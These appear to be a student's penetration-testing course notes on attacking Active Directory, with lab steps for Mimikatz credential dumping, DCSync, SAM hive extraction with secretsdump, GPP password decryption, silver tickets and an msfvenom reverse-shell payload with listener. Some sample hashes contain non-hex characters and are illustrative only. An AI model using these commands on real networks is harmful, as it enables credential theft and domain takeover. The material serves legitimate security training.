# Introduction to Active Directory
* **AD** is Microsoft's directory service for managing authentication, authorization, and access to Windows domain networks. It acts as a single point of control for admins to manage users, computers, and other devices.
  * Main objective of attacking AD is to gain **Domain Admin** (DA) access to a **Domain Controller** (DC).
* **Domain Controller** is the center of the network domain and is responsible for all interactions concerning the domain, including user logins, resources access, and more.
  * When a user logs into a domain-joined computer, the DC verifies the login credentials and grants appropriate access and privileges based on the stored user profiles and group policies.
* By default, active directory includes several groups, including **domain users** and **domain admins**. Members of the DA group hold significant levels of control, as they have admin access over the domain and are also assigned to the local administrator group of each domain-joined computer. This gives them unrestricted control over all domain computers.
  * Gaining access to the DC via DA credentials gives you ultimate control over an entire network domain. It facilitates moving through a network and performing administrative tasks unrestricted to exploit the system while appearing as a legitimate user.
<div align="center"><img width="551" height="516" alt="image" src="https://github.com/user-attachments/assets/97552527-d8aa-4aa6-b158-bd044d07af72" /></div>

## Active Directory Attacks Overview
### Password Attacks
* After gaining initial access to a Windows system, local and domain plaintext or hashed passwords on your target can be the key to privilege escalation and lateral movement.
  * Local passwords can be stored in various locations, such as in files and folders, and in the Windows registry, such as the SAM, SYSTEM, and SECURITY registry hives. The Local Security Authority Subsystem (LSASS) is a common place to find either local or domain passwords, but you can also find domain passwords within a Group Policy Preference (GPP).
  * Passwords found in these locations could be other users, admins, or even DAs. With these stolen plaintext passwords or hashes, you can impersonate legit users and gain unauthorized access to other machines, escalate your privileges, and further exploit the domain.

### Pass-the-Hash
* Pass-the-hash is a credential theft and lateral movement technique that involves stealing a user's NTLM (New Technology LAN Manager) hash password and using it to authenticate to other machines or services within a network without needing the plaintext password. Once authenticated with the stolen NTLM hash, you can move laterally to other machines you previously couldn't access or exploit the account's privileges by spawning processes with their permissions. If the stolen hash belongs to a Domain Admin, you could change this password to a plaintext password of your choosing, leaving the DC directly accessible.

### Foreign Group Attacks
* Once a child domain is compromised, you can aim even higher and leverage trust relationships to move up the trust chain and gain control over the whole forest. Foreign group membership allows security groups in one domain to include members from different but trusted domains. This means exploitation of one domain can escalate to another due to the cross-domain links.

## Introduction to AD Attack Tools
### Mimikatz
* If you need to dump domain passwords, Mimikatz is a powerful tool. It's designed to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory. It works particularly well with extracting from the LSASS process as it can effectively access it to obtain encrypted data, such as user passwords and access tokens. After extracting plaintext or NTLM password hashes, you can use Mimikatz to spawn processes or run DCSync attacks to impersonate the DC with the KRBTGT (Kerberos Ticket-Granting Ticket) hash.

#### Introduction to Mimikatz
* Mimikatz is an open-source post-exploitation tool designed for Windows systems. It allows attackers to extract sensitive authentication data such as passwords, tokens, and hashes directly from a system's memory. These extracted credentials can then be used in offline password-cracking attacks or leveraged for further network exploitation, such as pass-the-hash, pass-the-ticket, or even generating Golden Kerberos tickets, which provide extended access to systems.
* Initially developed by Benjamin Delpy as a proof of concept, Mimikatz was created to demonstrate the vulnerabilities in Microsoft's authentication protocol, particularly in how Windows handles credentials in memory. Although Microsoft has since introduced various mitigations, Mimikatz remains a critical tool in penetration testing and post-exploitation scenarios. Available on [GitHub](https://github.com/ParrotSec/mimikatz).

##### Use Cases
* Mimikatz excels in post-exploitation situations, where an attacker has already gained access to a system and seeks to elevate privileges or move laterally across a network. Here are some common use cases:
  * **Credential extraction**: Using the `sekurlsa::logonpasswords` module, attackers can steal plaintext passwords, hashes, and Kerberos tickets for all logged-in users, which can be used for further attacks.
  * **Pass-the-hash (PTH) attacks**: Once an NTLM hash is acquired, Mimikatz's `sekuralsa::pth` module can be used to authenticate to other systems without needing the plaintext password.
  * **Golden and Silver tickets**: Attackers can forge Keberos tickets to maintain persistence within a network. These tickets are difficult to detect and provide broad, long-term access to a domain.
 
 ##### Mimikatz Modules
 * Mimikatz is structured around different modules, each serving a specific function in extracting or manipulating data from a Windows system. These modules allow users to target specific aspects of system security, such as authentication tokens, credentials, or encrypted data. The Mimikatz module and command structure is as follows `module::command`. For example, if I wanted to see what the hostname of the machine was using Mimikatz, I could use the following module and command combination: `standard::hostname`.
 * You can use `help` to review a list of basic commands. Commonly used modules:
   * `sekurlsa`: This module is one of the most widely used in Mimikatz, `sekurlsa` (Security Local Security Authority) interacts with the system's memory to extract credentials, such as cleartext passwords, hashes, and Kerberos tickets. For instance, `sekurlsa::logonpasswords` command retrieves password information for all logged-in users.
     * `sekuralsa::logonpasswords` retrieves the login credentials of all users currently or recently logged into the system by accessing the Local Security Authority Subsystem Service (LSASS) memory. LSASS handles security policies, user logins, and password validation, meaning that it temporarily holds password hashes and other authentication tokens in memory. To diplay cached user hashes and locally stored passwords for all users who have logged into the machine, user the following module and command `sekuralsa::logonpasswords`. Mimikatz is reading nad parsing the LSASS memory, extracting all relevant authentication data stored there. It can reveal information for all logged-in users on the system, making it a powerful tool for expanding access. 
   * `kerberos`: Used to manipulate Kerberos tickets, which are essential for authentication in Windows networks. Attackers can use commands like `kerberos::golden` to create golden tickets or `kerberos::list` to display available Kerberos tickets.
   * `lsadump`: Extracts sensitive information, such as credentials and security policies, from the Local Security Authority (LSA). A common command is `lsadump::sam` for dumping password hashes from the Security Account Manager (SAM).
   * `privilege`: Crucial for elevating permissions within Mimikatz. Running `privilege::debug` grants the tool the necessary privileges to access restricted memory areas and perform many of its core functions.
     * Before Mimikatz can interact with sensitive system memory and extract credential information, it first needs elevated permissions. This is where the `privilege::debug` module comes into play. On Windows, certain operations, like reading memory to extract credentials, require debug privileges. Running this command first is critical because it elevates the tool's permissions to enable many of its core functionalities.
     * Without first running this command, most of Mimikatz's modules and commands won't work effectively, as the system's security controls will block them. When the tool is executed with **administrator** or **SYSTEM**-level privileges, putting Mimikatz into debug mode allows it to bypass these restrictions, granting access to the sensitive data stored in memory that Windows uses to authenticate users.
     * Executing `privilege::debug` should result in `Privilege '20' OK'`, confirming that Mimikatz is ready to access the necessary system functions that handle passwords, tokens, and Kerberos tickets.

##### LAB: Introduction to Mimikatz
* **Task 4**: `log` can be used to log Mimikatz input/output to a file
* **Task 5**: Hostname of base computer found with `standard::hostname``
* **Task 6**: Put Mimikatz into debug mode with `privilege::debug`. Successful return is `Privilege '20' OK`.
* **Task 8**: Used `sekurlsa::logonpasswords` to retrieved the hash of all users who have logged in locally.
* **Security identifier (SID)**: Used to identify a security principal or security group. Can represent any entity that the OS can authenticate. Examples include a user account, a computer account, or a thread or process that runs in the security context of a user or a computer account. For more, see [this](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers).

### PsExec
* The PsExec tool is a part of the Sysinternals Suite that allows users to launch an interactive command prompt on a remote system, execute processes, and redirect the output to the local system. It can be exploited to gain unauthorized access to other machines, such as with a pass-the-hash attack or with Chisel and Proxychains.

### Chisel
* Chisel is a powerful open-source tool that creates a TCP/UDP tunnel that's transported over HTTP and secured via SSH. It's used for port forwarding, passing through firewalls, and securing communications between machines. For AD, you can use Chisel to access internal networks by creating a network bridge between an attacking machine and a compromised machine. This allows you to access a previously inaccessible machine. 

### Proxychains
* `proxychains` is a tool designed to reroute traffic for TCP-based applications. It can be combined with Chisel to access an internal network via a compromised machine. With `proxychains`, you can create a SOCKS5 proxy to reroute traffic through the secure connection you've created with Chisel, making the traffic appear legitimate to gain access to the internal network.

### BloodHound
* BloodHound is a reconnaissance tool that allows you to graphically view an AD environment's user permissions, hidden relationships, sessions, and attack paths within a domain. With this, you can expose ways to escalate privileges and move laterally across the network.

### SharpHound
* SharpHound is BloodHound's data collector counterpart and is used to ingest data from the AD environments, which can then be analyzed in BloodHound. SharpHound enumerates the AD environment, collecting valuable information about users, groups, group memberships, organizational units, permissions, and more. The data is then processed by BloodHound, which graphically represents the complex relationships within the system.

# Local Passwords
* When landing on a Windows system as a result of initial access, your next steps will involve some sort of privilege escalation or lateral movement. Often, both of these techniques will rely on harvesting passwords from your target environment to accomplish this.
* Passwords can be found on your target host in various locations, including common places, such as the Windows registry, and uncommon places such as files and folders, the Security Account Manager (SAM), SYSTEM, SECURITY, and LSASS.

## Common Places
* **PowerUp**: Common local escalation tool is PowerUp.ps1 which searches for passwords in common places, including the Windows registry and unattended files. To use PowerUp, you'll first need to transfer it onto the target host and import the module in PS with `Import-Module .\PowerUp.ps1`. You can then execute it with `Invoke-AllChecks`. PowerUp will then search for the host for any passwords.
   * One specific location PowerUp checks is the registry. For example, it queries the following key to check for autologon credentials: `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CUrrentversion\Winlogon`. Without PowerUp, you can check this manually by running the following command from a terminal: `reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon"`.
   * Another place where PowerUp will check for is an adminstrator pass in either of these two paths: `C:\Windows\Panter\Unattend.xml` and `C:\Windows\Panther\Unattend\Unattend.xml`. In large scale deployments, unattended installations of Windows operating systems are necessary. System admins can set up admin passwords in these files. If improperly cleaned up at the end of installation, they can provide malicious users with the means to gain admin privileges over the target host.

### Offensive PowerShell: Privilege Escalation with PowerUp
* PowerUp is a PowerShell tool which is a part of the PowerSploit framework, a set of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. More can be found at the [GitHub](https://github.com/PowerShellMafia/PowerSploit).
* PowerUp automates the enumeration process and carries out checks mainly targeted at identifying common misconfigurations that could allow privilege escalation. Here are some techniques employed by PowerUp:
  * **Sevice enumeration**: Identifies user-configurable services that could be exploited for privilege escalation.
  * **Unquoted service paths**: Checks for services with unquoted file paths, which can lead to privilege escalation if the path contains whitespace.
    * Need to come back to *Lab: Privilege Escalation: Windows – Unquoted Service Paths*. 
  * **DLL hijacking**: Uncover insecure DLL loading that could be exploited for privilege escalation.
  * **Modifiable registry AutoRuns**: PowerUp identifies registry AutoRuns (programs automatically started by Windows) that can be modified by non-privileged users, potentially leading to arbitrary code execution with escalated privileges.
  * **AlwaysInstallElevated policy**: Checks if the registry policy 'AlwaysInstallElevated' is enabled, which could allow a non-privileged user to install Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
  * **Modifiable service binaries**: Identifies services where the current user context has permission to modify binaries, allowing a user to potentially execute code as SYSTEM.
  * **Unattended install files**: Checks for leftover unattended installation files that might still have administrator credentials within them.
  * **Group Policy Preferences password**: Examines Group Policy Preferences (GPP) files for any stored credentials.
  * **Cached GPP password**: Checks for any cached GPP passwords.
  * **Named pipe impersonation**: Checks for named pipe client impersonation opportunity, which can be leveraged to escalate privileges. 

#### Functions
* If you're concerned about the noise generated by `Invoke-AllChecks` or you want to focus in on something, you can use the following:
  * **Service Enumeration**:
    * `Get-UnquotedService`: returns services with unquoted paths with a space in the name.
    * `Get-ModifiableServiceFile`: returns services where the current user can write to the service binary path or its config.
    * `Get-ModifiableService`: returns services the current user can modify.
    * `Get-ServiceDetail`: returns detailed information about a specified service.
   * **Service Abuse**:
     * `Invoke-ServiceAbuse`: modifies a vulnerable service to create a local admin or execute a custom command.
     * `Write-ServiceBinary`: writes out a patched C# service binary that adds a local admin or executes a custom command.
     * `Install-ServiceBinary`: replaces a service binary with one that adds a local admin or executes a custom command.
     * `Restore-ServiceBinary`: restores a replaced service binary with the original executable.
    * **DLL Hijacking**:
      * `Find-ProcessDLLHijack`: finds potential DLL hijacking opportunities for currently running processes.
      * `Find-PathDLLHijack`: finds service %PATH% DLL hijacking opportunities.
      * `Write-HijackDll`: Writes out a hijackable DLL.
     * **Registry Checks**:
       * `Get-RegistryAlwaysInstallElevated`: checks if the AlwaysInstallElevated registry key is set.
       * `Get-RegistryAutoLogon`: checks for Autologon credentials in the registry.
       * `Get-ModifiableRegistryAutoRun`: checks for any modifiable binaries/scripts (or their configs) in HKLM (HKEY_LOCAL_MACHINE is a primary hive in the Windows Registry containing machine-wide configuration settings for hardware, software, and the OS. Essential for system stability) autoruns.
     * Miscellaneous Checks:
       * `Get-ModifiableScheduledTaskFile`: find schtasks with modifiable target files.
       * `Get-UnattendedInstallFile`: finds remaining unattended installation files.
       * `Get-Webconfig`: checks for any encrypted web.config strings.
       * `Get-ApplicationHost`: checks for encrypted application pool and virtual directory passwords.
       * `Get-SiteLitePassword`: retrieves the plaintext passwords for any found in McAfee's SiteList.xml files.
     * Other Functions:
        * `Get-ModifiablePath`: tokenizes an input string and returns the files in it that the current user can modify.
        * `Get-CurrentUserTokenGroupSid`: returns all SIDs that the current user is a part of, whether they're disabled or not.
        * `Add-ServiceDacl`: adds a DACL field to a service object returned by Get-Service.
          * A DACL (Discretionary Access Control List) is essentially the "who can do what" list for an object in Windows. Every file, folder, and service has one. It consists of Access Control Entities (ACEs) which might say User A has "Read" permissions, Admins have "Full Control" and Interactive Users have "Start/Stop" permissions. 
        * `Set-ServiceBinPath`: sets the binary path for a service to a specified value through Win32 API methods.
        * `Test-ServiceDaclPermission`: tests one or more passed services or service names against a given permission set.
          * If you can't run PowerShell, `accesschk.exe` is a legendary Microsoft SysInternals tools that you can use to see services a specific group has write access to, such as `accesschk.exe /accepteula -uwcqv "Everyone" *` and `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`, `-u` to supress errors, `-w` to show objects that have write access, `-c` name is a Windows service, `-q` for not showing banner (quiet), and `-v` for verbose. If you already have a service in mind, such as UsoSvc, you can use `accesschk.exe /accepteula -ucqv "YourUsername" UsoSvc`. If you found an unquoted service path, use this to determine if you can drop a file into one of the folders on that path: `accesschk.exe /accepteula -dqv "C:\Program Files\Vulnerable App\"`, `-d` to only process directories.
            * In the output, you want to look for things `SERVICE_ALL_ACCESS` which means you own the service (you can start/stop/configure it). `SERVICE_CHANGE_CONFIG` which means you can change the `binpath` to point to your reverse shell. `WRITE_DAC` to change the permissions of the service to give yourself `SEVICE_CHANGE_CONFIG`. `WRITE_OWNER` to become owner of the service and then change its permissions. 
        * `Write-UserAddMSI`: writes out an MSI installer that prompts for a user to be added.
        * `Invoke-AllChecks`: runs all current enumeration checks and returns a report. 

#### LAB: Introduction to PowerUp.ps1
* **Task 1**: `Import-Module .\PowerUp.Ps1`
* **Task 2**: `Invoke-AllChecks` is the PowerUp function which performs all enumeration checks on a target system.
* **Task 6**: To run as another user, we use `runas /user:user1 powershell`
* **Task 10**: We use Metasploit in our Kali box to create an `exe-service` reverse shell payload with `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.102.122.194 lport=4444 -f exe-service > Temp.exe`.
  * When you find a service that you can reconfigure (using those `accesschk` or these PowerUp techniques), you can't just use a standard .exe. You have to use a file that speaks the "Service Control Manager" (SCM) language.
* **Task 11** RDPing into the Desktop box using `xfreerdp` and mapping the drive: `xfreerdp /v:10.102.65.250 /u:user1 /dynamic-resolution +drives /drive:root,/home/kali`
* **Task 14** To start a listener, `msfconsole` --> `use exploit/multi/handler` --> `set PAYLOAD windows/x64/meterpreter/reverse_tcp` --> `set LHOST 10.102.122.194` --> `set LPORT 4444` --> `run`. I was stupid and renamed my exploit from Temp at first, and it didn't work, and then I realized it's Temp because of `Temp Folder`. 

## Uncommon Places
* While PowerUp's automated checks search for cleartext passwords, it doesn't look everywhere. Keep in mind that people often leave credentials in files. Manually browsing every folder and reading each file is time-consuming, but PowerShell offers a handy alternative. For example, the following command recursively searches the whole C:\ drive for a specific keyword in the file name: `Get-ChildItem -Path "C:\" -Recurse -Filter "*keyword*" -ErrorAction SilentlyContinue -Force`. Alternatively, this command will recursively search for a keyword within all the files in the C:\ drive: `Get-ChildItem -Path "C:\" -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "keyword"`. Using these commands, you can search for keywords like `password, pass, username, user, credential, cred, secret, login`.

## SAM, SYSTEM, and SECURITY
* The SAM (Security Account Manager) is a core Windows component that stores user account credentials in hashed formats. Its functionality relies on two other vital registry hives: SYSTEM and SECURITY. Together, they form a crucial trifecta in preservering system security and regulating access control.
  * **SAM**: Stores user accounts and hashed passwords
  * **SYSTEM**: Manages system configuration, including installed hardware and device drivers
  * **SECURITY**: Handles user permissions and group relationships
* These hives can't be accessed directly while the system is operational, requiring backups for offline analysis. Since Windows 2008 R2/Vista, reconstructing the SAM offline requires backups of all three hives. While the SECURITY and SYSTEM hives contian portions of the boot key cruical for decrypting the SAM's password hashes, the SAM hive houses the hashed passwords themselves.
* These hives can be saved to file and backed up using `reg` command: `reg save HKLM\<HIVE> <backup file>`.

#### Obtaining User Hashes
* If an attacker gains access to a saved copy of SAM, SYSTEM, and SECURITY, it may be possible to obtain the user hashes for accounts on the host. For example, to save the hives, you'd need to run the following commands:
```
reg save HKLM\SAM SAM.bak
reg save HKLM\SECURITY SECURITY.bak
reg save HKLM\SYSTEM SYSTEM.bak
```
* Once the hives are backed up and transferred to the attacking machine, you can use `impacket` to obtain hashes with `impacket-secretsdump -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL`. The LOCAL portion of the command replaces the host parameter you'd normally use for `impacket-secretsdump`, letting it know that this is an offline dump.
  * The output format will always be **Username:SID:LM HASH:NTLM HASH**. See example below:
 ```
[*] Target system bootKey: 0x0e34e1028a848aa7b0bc6eb236c0f229
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d:::
iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::
```
  * Although LM hashes are no longer used (obsolete, insecure), the empty LM hash is added to the user's hash for backward compatability reasons.
    *  `aad3b435b51404eeaad3b435b51404ee` is the LM hash for empty password. Important to remember!
    *  Accounts with an SID of 5xx are system accounts, while accounts with 1xxx are created by the admin. In this example (`iml-user:1000:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::`), iml-user was added by an admin.
    *  You are the most interested in the NTLM hash most oftem, as it allows you to pass it to a system instead of a password. More on this later ...

 ## LSASS and Mimikatz
 * The LSASS (Local Security Authority Subsystem Service) in Windows plays a critical role in managing the system's security policy and handling user logins. However, examining LSASS while Windows is running involves a series of challenges, mostly due to its privileged status and built-in security mechanisms.
 * In contast, using a tool like Mimikatz presents a practical method of accessing and analyzing LSASS data. Mimikatz is a utility designed to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory, particularly from LSASS process.
   * While the system is operational, Mimikatz can effectively access LSASS, even obtaining encrypted data, such as user passwords and access tokens.
   * In the example, Mimikatz obtained a session for user j.michaels on host CLIENT and was able to extract info from MSV, WDigest, and Kerberos Security Support Providers (SSP). You will rarely find WDigest enabled on a host in real life, but when you do, you hit the jackpot as that SSP holds the user's password in cleartext.
  
### LAB: Active Directory Local Passwords
* Setup: You will need to connect to the initial target using `xfreerdp /u:<username> /v:<Target IP> [/d:Domain] +clipboard +drives /drive:share,/home/kali /dynamic-resolution`
* **Task 1**: `xfreerdp /u:j.holloway /v:10.102.137.48 +clipboard +drives /drive:share,/home/kali /dynamic-resolution`. 
* **Task 2**: To search recursively for a credentials file in `C:\Users`, I used `Get-ChildItem -Path "C:\Users" -Recurse -Filter "*cred*" -ErrorAction SilentlyContinue -Force` first, but it said to use both, so I also tried `Get-ChildItem -Path "C:\Users| -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern "credential"`. The first returned way cleaner results because it returned PATHS with the keyword, while the second returned instances of that string - a lot of mess!
* **Tast 3 and onwards**: Pivoted to new Windows host (m.gibbs) via `xfreerdp` with the credentials found using the file from task 2. Then used `reg save HKLM\* *.bak` for the three registries. Once the hives were backed up and transferred to the attacking machine, I did `impacket-secretsdump -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL` which resulted in admin NTLM hash. 

# Domain Passwords
* Domain passwords often serve as low-hanging fruit for privilege escalation, lateral movement, and other exploitation within a domain. One key area of particular interest are passwords stored within Group Policy Preferences (GPP). GPP, while designed to simplify configuration management across multiple machines, could be vulnerable to password attack and lead to decryption of a plaintext password.
  * If an admin's plaintext password is uncovered, this provides privileges to run tools like Mimikatz to help extract other domain password hashes and further infiltrate the domain.
 
## Group Policy Preferences (GPP)
* GPP allows domain-joined machines to be configured via a group policy. Admins can use GPP to configure computer and user configuration settings, including managing scheduled tasks, modifying registry settings, mapping network drives, and more.
* GPP also allows admins to set local account passwords so they can manage access across the domain at the machine level. This makes GPPs potentially vulnerable, as stored passwords could be exploited to gain access to local administrator accounts on domain-joined machines.
* Group policies for account management are stored on the domain controller in the SYSVOL folder. Sometimes, these files contain simple configurations, such as renaming an existing account, but others may have a "cpassword" field. This field is used to set passwords for local accounts through Group Policy.
* The `groups.xml` file is a type of GPP file that contains configurations for adding, deleting, or modifying local groups, and it can also contain settings related to usernames and passwords. Here is an example of what a `group.xml` file looks like with a "cpassword" field:
```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{A1A1A1A1-B2B2-C3C3-D4D4-E5E5E5E5E5E5}">
    <User clsid="{F6F6F6F6-E7E7-D8D8-C9C9-B0B0B0B0B0B0}" name="Example-Admin" image="2" changed="2025-01-03 09:12:34" uid="{81AB2328-D1C8-01B4-0CE8-ECBD2BA52E04}" userContext="0" removePolicy="0">
        <Properties action="U" newName="" fullName="" description="" cpassword="BJl8ZZPxu6fDqm/mUK/djGzAhNITOd3iREOAWZRgUaHqcx+o/pBtzpzSU/JK0unv" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" subAuthority="" userName="Example-Admin"/>
    </User>
</Groups>
```
* Here, the user Example-Admin has their password set; however, the cpassword is encrypted with a predefined 32-byte AES private key, which Microsoft publicly outlined in 2012 on the MSDN site. THis means that anyone can use this AES key to decrypt the password to its plaintext. Though Microsoft patched this vulnerability with MS14-025 by preventing admins from putting passwords into new GPP, it didn't affect any GPP that were already in place, leaving many orgs still vulnerable if they weren't delete or disabled.
* Other XML files that could include passwords are `services.xml`, `scheduledtasks.xml`, and `datasources.xml`, and are all accessible via the SYSVOL directory. Domain users have read access to SYSVOL, meaning they can search the SYSVOL for XML files containing a cpassword.
  * With access to these XML files, if the GPP hasn't been deleted or disabled since the patch, you can use the AES private key to decrypt a cpassword and reveal domain passwords for further exploitation.
* **Get-GPPPassword** is a PowerShell script that retrieves plaintext passwords and other information for accounts pushed through GPPs. It searches the domain controllers for `groups.xml`, `scheduledtasks.xml`, `services.xml`, and `datasources.xml`, and decrypts and returns any password it finds. Import the script after moving it to the machine with `. .\Get-GPPPassword.ps1`. Once imported, run it with `Get-GPPPassword`.
  * Alternatively, if you have a Meterpreter session on a target, you could use the `post/windows/gather/credentials/gpp` Metasploit module to dump GPP credentials. This module will search for cpassword values stored in GPP and decrypt them with the known AES key.

## Mimikatz
* With your new admin credentials, you'll be able to log in as the adminstrator and run Mimikatz against the target to extract domain users' passwords, hashes, and more.

### Dumping Passwords
* As you learned in a previous lab, Local Passwords, you can use Mimikatz to dump any logged-in users on the system. As a quick refresh, you first transfer Mimikatz to the target. Next, open Mimikatz as admin and then acquire debug privilege through `privilege::debug`.
* Dump user sessions with `sekurlsa::logonpasswords`. Any user session credentials will then be displayed in the output. From here, you can log into the domain-joined machine with any found credentials and check the account's level of access. To do this, open command prompt with admin privileges and run `net user <user> /domain`. You can then find out which groups the user is a member of in the **Global Group memberships** field in the returned output, such as example shown below. In that example, j.doe is a member of the Domain Admins group - success!:
```
User name                    j.doe                                                                                    
Full Name                                                                                                               
Comment                                                                                                                 
User's comment                                                                                                          
Country/region code          000 (System Default)                                                                       
Account active               Yes                                                                                        
Account expires              Never                                                                                                                                                                                                              Password last set            2/27/2025 10:20:34 AM                                                                      
Password expires             Never                                                                      
Password changeable          2/28/2025 10:20:34 AM                                                                      
Password required            Yes                                                                                        
User may change password     Yes                                                                                                                                                                                                                Workstations allowed         All                                                                                        
Logon script                                                                                                            
User profile                                                                                                            
Home directory                                                                                                          
Last logon                   3/11/2025 4:11:07 PM                                                                                                                                                                                               Logon hours allowed          All                                                                                                                                                                                                                Local Group Memberships                                                                                                 
Global Group memberships     *Domain Admins        *Domain Users                                                        
```

### DCSync Attack
* Domain Admin credentials are high-value targets in any attack. But what if you're after a different account? After you've compromised a Domain Admin you now have domain replication privileges. With these privileges, you can perform a DCSync attack.
* A **DCSync attack** allows you to impersonate a Domain Controller (DC) and request password hashes from a target DC using Directory Replication Services (DRS) Remote Protocol. Normally, DCs use replication to synchronize with each other to ensure consistency of data across the domain. In this attack, you mimic DC behavior and request other DCs to replicate data - asking for copies of the AD database. This usually results in access to password hashes and potentially other sensitive information, which can then be used for a number of attacks, including **Golden Ticket** and **Pass-the-Hash**.
* One example of using DCSync is to target the **krbtgt** built-in domain account. This account's main function is to provide tickets to authenticated users, which validates a user to services within the domain. If you can obtain the NTLM password hash for this domain account, you'll be able to forge Kerberos tickets that allow you to authenticate as any user in the domain.
* To run a DCSync attack, you'll need to log into the machine with the DA credentials. You'll then need to use Mimikatz as an administrator, and run the following command: `lsadump::dcsync /user:EXAMPLE\krbtgt`. In the example below, the krbtgt account of the EXAMPLE domain is being targeted. The command returns a verbose amount of information, but most importantly, it returns the krbtgt NTLM hash, `a1b4c3e2f1d48901e5f6a7b8c9d0a1b2`. With this, you can now create a Golden Ticket or perform a Pass-the-Hash attack. 
```
[DC] 'example.com' will be the domain
[DC] 'DC01.example.com' will be the DC server
[DC] 'EXAMPLE\krbtgt' will be the user account
[rpc] Service : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN : krbtgt

** SAM ACCOUNT **

SAM Username : krbtgt
Account Type : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration :
Password last change : 3/13/2024 11:30:10 AM
Object Security ID : S-1-5-18-4007567892-5236398763-5035627893-707
Object Relative ID : 707

Credentials:
Hash NTLM: a1b4c3e2f1d48901e5f6a7b8c9d0a1b2
ntlm- 0: a1b4c3e2f1d48901e5f6a7b8c9d0a1b2
lm - 0: 4dcbadba2543d8b9f2a1b3c5d6e4f7g8

Supplemental Credentials:

Primary:NTLM-Strong-NTOWF *
Random Value : 30rf157qq3de115dx225w99011bg21f5

Primary:Kerberos-Newer-Keys *
Default Salt : EXAMPLE.COMkrbtgt
Default Iterations : 4096
Credentials
aes256_hmac (4096) : 6b1bbb22513062c2ff27394f87b1f64efc21h475gf70cz38e2302f45f4dfccf3
aes128_hmac (4096) : 823gf30b2372fd16gz59bdcd16hh57cf
des_cbc_md5 (4096) : 5gb263c8e963h773

Primary:Kerberos *
Default Salt : EXAMPLE.COMkrbtgt
Credentials
des_cbc_md5 : 5gb263c8e963h773

Packages *
NTLM-Strong-NTOWF

Primary:WDigest *
01 1fd991f17f940851pz09ahgf797b91f1
02 8cg2c66537c63gf8fd9d4b11d2f7f1fe
03 f2dacc115960f0f61fg9c27b3f3g4fe8
04 1fd991f17f940851pz09ahgf797b91f1
05 8cg2c66537c63gf8fd9d4b11d2f7f1fe
06 gf1654cd36ff9f20f9482c346dfcdbhg
07 1fd991f17f940851pz09ahgf797b91f1
08 df3b5c38956b87c26hfed10437ccf702
09 df3b5c38956b87c26hfed10437ccf702
10 fe636516f643afg6d371b120f98g7fhf
11 6eddb93g8f837396ahg943f9c1f4dgh7
12 df3b5c38956b87c26hfed10437ccf702
13 b2ca09g6f89feda3140f9c43b1dgdfd2
14 6eddb93g8f837396ahg943f9c1f4dgh7
15 85376h713f017cb8h36dchfdg334ig16
16 85376h713f017cb8h36dchfdg334ig16
17 3d9gh886g6h8weg4edeg7gg33c30711c
18 4g3c17fb2f83d1h1ggh71f0f544dg934
19 388e1g63df1346577c8083dd1659663b
20 fh38cd2cc56ed3bcdgf615b5b3663gb7
21 1h59eabcg56c530d0126146615c18gf9
22 1h59eabcg56c530d0126146615c18gf9
23 eg5f4g0g76g8fd8fhdha86f9105708d3
24 51f2g560cb2390g45g8d21336547agi6
25 51f2g560cb2390g45g8d21336547agi6
26 g68afdc215b9d4de2f9h5f36eg6bf3gh
27 de71dg509515f5fah8h5gh1069g28453
28 4h0c24481j0g418gfdacb74701436gh5
29 f34ghgf88g134dfg0f76g5h062914ch2
```

### LAB: Kerberos: Golden and Silver Tickets
#### Silver Tickets
* Silver tickets are aimed at service accounts. They allow an attacker to forge a TGS (Ticket-Granting Service) ticket for a specific service under any user account. For example, an MSSQL server only allows users that are part of the MSSQL group to log in. You can forge a silver ticket with this attack and connect to the MSSQL instance to retrieve sensitive data. To forge a silver ticket, you'll need:
  * Domain security identifier (SID)
  * Domain fully qualified domain name (FQDN)
  * Service account's password hash
  * Username to impersonate
  * Service name
  * Target
* Obtaining the data from active directory: to get the domain SID, run `whoami /user` in a command prompt under a domain user account. This will return an output that has the user security identifier. We can derive the domain SID from the user SID by removing the last four digits and the hyphen preceding them. The domain FQDN can be retrieved from a domain-joined machine by issuing the following command: `systeminfo | findstr /B /C:"Domain"`.
* The service account's password hash is generally dumped from a machine or computed from the password after a successful Kerberoast attack, for example. For the purpose of this specific lab, the password hash of the **iis_service** account is provided. Finally, to get the service and target host, use the following: `setspn -L <service account name>`. The output is in the format `[service]/[target]`.
* Once all the information is gathered, you can proceed to create your ticket. This lab uses Mimikatz to create tickets. First, we are going to log into workstation-01 with `xfreerdp /v:<Workstation-01 IP> /u:s.villanelle /d:krbtown /p:Summ3r2021! /dynamic-resolution +clipboard`. Then, we are going to use Mimikatz to create our ticket with the following placeholder command: `kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /service:<The service we are trying to connect to> /target:<The target server> /rc4:<The password hash of the service account>`.
